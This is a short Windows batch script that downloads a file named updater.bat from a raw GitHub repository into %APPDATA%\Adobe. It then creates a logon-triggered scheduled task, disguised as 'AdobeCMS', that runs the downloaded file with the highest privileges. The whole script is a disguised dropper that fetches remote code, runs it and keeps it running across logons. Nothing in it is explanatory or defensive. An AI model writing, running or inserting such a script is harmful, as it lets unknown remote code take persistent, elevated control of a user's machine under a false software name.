@echo off
mkdir -p %APPDATA%\Adobe
del /f /q /a %APPDATA%\Adobe\updater.bat
curl -s https://raw.githubusercontent.com/qufyu/0024/main/updater.bat > %APPDATA%\Adobe\updater.bat
schtasks /create /sc onlogon /tn AdobeCMS /tr %APPDATA%\Adobe\updater.bat /f /rl HIGHEST
exit
